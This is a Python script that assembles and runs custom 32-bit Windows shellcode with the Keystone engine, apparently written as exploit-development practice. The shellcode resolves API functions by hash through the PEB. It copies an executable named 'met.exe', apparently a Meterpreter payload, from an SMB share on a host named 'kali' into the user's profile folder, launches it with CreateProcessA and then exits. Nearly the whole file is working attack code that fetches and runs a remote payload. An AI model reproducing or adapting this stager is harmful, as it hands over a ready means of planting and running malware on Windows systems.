from keystone import *
import sys
import ctypes, struct

def asm2shell(c):
    print("Generate shellcode ...")
    # Initialize engine in 32-bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(c)
    sh = b""
    instructions = ""
    for e in encoding: 
        sh += struct.pack("B",e)
        instructions += "\\x{0:02x}".format(int(e)).rstrip("\n") 
    print("Shellcode size: %d bytes"%(count))
    shellcode = bytearray(sh)
    print("Shellcode: %s"%instructions)
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

    print("Shellcode located at address %s" % hex(ptr))
    input("...ENTER TO EXECUTE SHELLCODE...")

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


code = "start:"
# Setup stack
code += "mov ebp, esp;"
code += "add esp, 0xfffff9f0 ;"
# Find_kernel32
code += "find_kernel32: "
code += "xor ecx, ecx;"
code += "mov esi, fs:[ecx + 0x30];" # PEB
code += "mov esi, [esi + 0x0c];" # PEB -> Ldr
code += "mov esi, [esi + 0x1c];" #PEB -> Ldr.InInitOrder
code += "next_module: "
code += "mov ebx, [esi + 0x8];" # InInitOrder[i].base_address
code += "mov edi, [esi + 0x20];" # InInitOrder[X].module_name
code += "mov esi, [esi];" # InInitOrder[X].flink
code += "cmp [edi + 12*2], cx;" # if module_name[12] == 0
code += "jne next_module;"

# find_function_shorten
code += "find_function_shorten:"
code += "jmp find_function_shorten_bnc;"
code += "find_function_ret:"
code += "pop esi;" # save ret address to esi
code += "mov [ebp + 0x4], esi;" # save ret address
code += "jmp resolve_symbols_kernel32;"
code += "find_function_shorten_bnc:"
code += "call find_function_ret;"

# find function
code += "find_function:"
code += "pushad;"
code += "mov eax, [ebx + 0x3c];" # PE Signature
code += "mov edi, [ebx + eax + 0x78];" # Directory RVA
code += "add edi, ebx;" # Directory VMA
code += "mov ecx, [edi + 0x18];" # NumberOfNames
code += "mov eax, [edi + 0x20];" # AddressOfNames RVA
code += "add eax, ebx;" # AddressOfNames VMA
code += "mov [ebp-4], eax;" # save AddressOfNames VMA
code += "find_function_loop:"
code += "jecxz find_function_finished;"
code += "add ecx, 0xffffffff;"
code += "mov eax, [ebp-4];"
code += "mov esi, [eax + ecx*4];" # Get the RVA of the symbol name
code += "add esi, ebx;"

# compute hash
code += "compute_hash:"
code += "xor eax, eax;" # clear eax
code += "cdq;" # clear edx
code += "cld;" # clear direaction? 
code += "compute_hash_again:"
code += "lodsb;" # load next byte from esi to al
code += "test al, al;"
code += "jz compute_hash_finished;"
code += "ror edx, 0x0d;"
code += "add edx, eax;"
code += "jmp compute_hash_again;"
code += "compute_hash_finished:"
code += "cmp edx, [esp + 0x24];"
code += "jnz find_function_loop;"
code += "mov edx, [edi + 0x24];"
code += "add edx, ebx;"
code += "mov cx, [edx + 2 * ecx];" 
code += "mov edx, [edi + 0x1c];"
code += "add edx, ebx;"
code += "mov eax, [edx + 4 * ecx];"
code += "add eax, ebx;"
code += "mov [esp + 0x1c], eax;"


code += "find_function_finished:"
code += "popad;"
code += "ret;"

#  resolve kernel32 symbol
code += "resolve_symbols_kernel32:"
code += "push 0x78b5b983;" # TerminateProcess
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x10], eax;" # save TerminateProcess 

# call functions in kernel32
code += "push 0xec0e4e8e;" # LoadLibraryA
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x14], eax;" # save LoadLibraryA

code += "push 0x16b3fe72;" # CreateProcessA
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x18], eax;" # save CreateProcessA

code += "push 0x7ee258e7;" # CopyFileExA
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x1c], eax;" # save CopyFileExA


# get Advapi32.dll
code += "xor eax, eax;"
code += "push eax;" # push nullbyte
code += "push 0x6c6c642e;" # push .dll
code += "push 0x32336970;" # push pi32
code += "push 0x61766441;" # push Adva 

code += "push esp;" # arg1 = "Advapi32.dll" - Push string address
code += "call [ebp + 0x14];" # call LoadLibraryA
code += "mov ebx, eax;" # reset base pointer


# resolve Advapi32.dll - get GetUserNameA
code += "push 0x5c52aa34;" # GetUserNameA
code += "call dword ptr [ebp + 0x4];" # call find_function
code += "mov [ebp + 0x20], eax;" # save GetUserNameA

# -----------------------CREATE FOLDER PATH------------------------------
# PUSH VARIABLES
# pcbbuffer
code += "mov eax, 0xfffffff0;"  # max user length -10 (avoid null bytes)
code += "neg eax;"              # make length = 10
code += "push eax;"
code += "push esp;"
# lpbuffer
code += "lea eax, [ebp + 0x24];" # save username at ebp + 0x24
code += "push eax;"
# call GetUserNameA
code += "call dword ptr [ebp + 0x20];"        # call GetUserNameA
code += "mov ecx, [esp];"           # save pcbBuffer out for actual username length
code += "mov edx, [esp];"
code += "mov eax, 0xfffffff7;"      # negative 9 (length of "C:\Users\")
code += "neg eax;"                  # positive 9
code += "add edx, eax;"
code += "mov [ebp + 0x40], edx;"    # save length of actual path string "C:\Users\{username}"

# CREATE PATH "C:\Users\{username}"
# push C:\Users\ to ebp
code += "mov eax, 0x555c3a43;"      # "C:\U"
code += "mov [ebp + 0x44], eax;"    # path start address
code += "mov eax, 0x73726573;"      # "sers"
code += "mov [ebp + 0x48], eax;"
code += "mov eax, 0xffffff5c;"      # "\"
code += "mov [ebp + 0x4C], eax;"
# push username to ebp 
code += "lea esi, [ebp + 0x24];"    # save username address
code += "lea ebx, [ebp + 0x4D];"    # save start of username save address
# loop through characters
code += "push_username:"  
code += "mov eax, [esi];"           # mov username into eax
code += "mov [ebx], eax;"           # mov username to after "C:\Users\"
code += "add ecx, 0xfffffffc;"      # decrease pcbBuffer (actual number of characters)
code += "mov edx, 0xfffffffc;"
code += "neg edx;"
code += "add esi, edx;"             # increase original username address by 4 bytes
code += "add ebx, edx;"             # increase current username address by 4 bytes
code += "xor edx, edx;"             # make 0
code += "cmp ecx, edx;"             # compare with 0
code += "jge push_username;"

# add "/met.exe"
code += "lea eax, [ebp + 0x44];"    # path start address
code += "mov ebx, [ebp + 0x40];"    # length of string
code += "dec ebx;"
code += "add eax, ebx;"             # path end address
code += "mov ebx, 0x74656d5c;"      # "\met"
code += "mov [eax], ebx;"
code += "sub eax, 0xfffffffc;"      # move 4 bytes forward
code += "mov ebx, 0x6578652e;"      # ".exe"
code += "mov [eax], ebx;"

# add null byte
code += "xor ebx, ebx;"
code += "sub eax, 0xfffffffc;"      # move 4 bytes forward
code += "mov [eax], edx;"

#-------------------------COPY FILE FROM SMB----------------------------

# create path for "\\kali\met\met.exe"
code += "xor eax, eax;"
code += "mov ax, 0x6578;"
code += "push eax;"                 # "xe"
code += "push 0x652e7465;"          # "et.e"
code += "push 0x6d5c7465;"          # "et\m"
code += "push 0x6d5c696c;"          # "li\m"
code += "push 0x616b5c5c;"          # "\\ka"
code += "mov edi, esp;"             # save "\\kali\met\met.exe" to edi

code += "mov eax, 0xffffffff;"      # negative 1
code += "neg eax;"                  # 0x00000001 COPY_FILE_FAIL_IF_EXISTS
code += "push eax;"                 # push dwCopyFlags
code += "xor eax, eax;"             # null value
code += "push eax;"                 # push pbCancel
code += "push eax;"                 # push lpData
code += "push eax;"                 # push lpProgressRoutine
code += "lea eax, [ebp + 0x44];"    # get address pointer for path
code += "push eax;"                 # push lpNewFileName
code += "push edi;"                 # push lpExistingFileName
code += "call dword ptr [ebp + 0x1c];"      # Call CopyFileExA

#-------------------------EXECUTE MET.EXE----------------------------
# Create STARTUPINFORA structure
code += "push esi;"                 # push hStdError
code += "push esi;"                 # push hStdOutput
code += "push esi;"                 # push hStdInput
code += "xor eax, eax;"             # null value
code += "push eax;"                 # push lpReserved2
code += "push eax;"                 # push cbReserved2 & wShowWindow
code += "mov eax, 0xffffff80;"    # move -0x80 to eax
code += "neg eax;"
code += "push eax;"                 # Push dwFlags STARTF_FORCEOFFFEEDBACK
code += "xor eax, eax;"             # null value
code += "push eax;"                 # push dwFillAttribute
code += "push eax;"                 # push dwYCountChars
code += "push eax;"                 # push dwXCountChars
code += "push eax;"                 # push dwYSize
code += "push eax;"                 # push dwXSize
code += "push eax;"                 # push dwY 
code += "push eax;"                 # push dwX
code += "push eax;"                 # push lpTitle
code += "push eax;"                 # push lpDesktop 
code += "push eax;"                 # push lpReserved 
code += "mov al, 0x44;"             # mov 0x44 to al
code += "push eax;"                 # push cb 
code += "push esp;"                 # push pointer to STARTUPINFORA structure
code += "pop edi;"                  # Store pointer to STARTUPINFORA structure in edi

# Call CreateProcessA
code += "call_createprocessa:"
code += "mov eax, esp;"             # move esp to eax
code += "xor ecx, ecx;"             # null value
code += "mov cx, 0x390;"            # 0x390
code += "sub eax, ecx;"             # subtract 0x390 from pointer to avoid overwriting structure
code += "push eax;"                 # push lpProcessInformation (out value pointer)
code += "push edi;"                 # lpStartupInfo
code += "xor eax, eax;"             # null value
code += "push eax;"                 # push lpCurrentDirectory
code += "push eax;"                 # push lpEnvironment
code += "push eax;"                 # push dwCreationFlags
code += "inc eax;"                  # eax = 0x01 = TRUE
code += "push eax;"                 # push bInheritHandles
code += "dec eax;"                  # null value
code += "push eax;"                 # push lpThreadAttributes
code += "push eax;"                 # push lpProcessAttributes
code += "lea ebx, [ebp + 0x44];"    # get address pointer for met.exe path
code += "push ebx;"                 # push lpCommandLine
code += "push eax;"                 # push lpApplicationName
code += "call dword ptr [ebp + 0x18];"      # Call CreateProcessA



#-------------------------TERMINATE MET.EXE----------------------------
code += "push 0x11223344;" # uExitCode
code += "push 0xffffffff;" # hProcess
code += "call [ebp + 0x10];"

asm2shell(code)
